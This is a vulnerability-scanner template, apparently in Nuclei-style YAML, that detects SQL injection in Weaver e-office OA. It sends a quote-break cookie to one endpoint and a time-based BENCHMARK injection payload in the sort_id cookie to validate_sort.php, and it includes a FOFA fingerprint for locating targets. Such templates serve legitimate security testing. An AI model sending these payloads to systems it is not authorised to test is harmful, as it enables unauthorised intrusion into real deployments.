id: poc-yaml-weaver-e-office-validate-sort-sqli
info:
  name: 泛微OA e-office validate_sort SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: e-office
    fofa: app="泛微-EOffice"

variables:
  t1: "{{rand_int(3,7)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - id: loginedit-check
    method: GET
    path:
      - "{{BaseURL}}/general/system/interface/loginedit/word_update.php"
    headers:
      Cookie: "sort_id=1'"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "supplied argument is not a valid MySQL result resource in"

  - id: validate-sort-check
    method: GET
    path:
      - "{{BaseURL}}/general/officeitem/sort/validate_sort.php"
    headers:
      Cookie: "sort_id=1 AND 4225=BENCHMARK({{t1}}000000,MD5(0x4567684e))"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
